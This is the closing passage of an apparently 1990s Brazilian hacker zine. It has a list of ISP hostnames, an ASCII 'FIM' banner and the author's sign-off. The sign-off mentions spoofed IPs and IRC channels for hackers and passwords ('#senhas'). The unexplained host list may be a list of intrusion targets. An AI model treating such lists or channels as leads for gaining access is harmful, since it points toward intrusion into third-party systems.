+dolar.vanet.com.br		(vanet internet solutions)
+ftp.mandic.com.br		(mandic)
+nh.conex.com.br			(conex brasil-noia)
+poa01.datacontrol.com.br	(datacontrol net)
+ftp.nutecnet.com.br		(nutecnet)
+ftp.hotnet.com.br		(hotnet)
+omega.procergs.com.br		(via-rs)
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+                FFFFFFFFFFFF  IIII  NNNN        NNN
+                FFFFFFFFFFFF  IIII  NNNNNN      NNN
+                FFFF                NNN NNN     NNN
+                FFFF          IIII  NNN  NNN    NNN
+                FFFFFFFFFFFF  IIII  NNN   NNN   NNN
+                FFFFFFFFFFFF  IIII  NNN    NNN  NNN
+                FFFF          IIII  NNN     NNN NNN
+                FFFF          IIII  NNN      NNNNNN
+                FFFF          IIII  NNN       NNNNN
+                FFFF          IIII  NNN        NNNN
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Este zine é escrito por Cheat Struck.
+No e-mail;
+No page;
+No ICQ;
+No IP fixed, IP spoofed;
+A unica maneira de me acharem na inet é:
+server  irc.via-rs.com.br:6667
+canais  #via-rs
+        #hackers
+        #senhas
+	#UKE
+	#CSCHANNEL (canal fundado recentemente por mim, nem sempre no ar)
+Quando
+	Sextas e Sabados(raramente) das 12:00 as 6:00
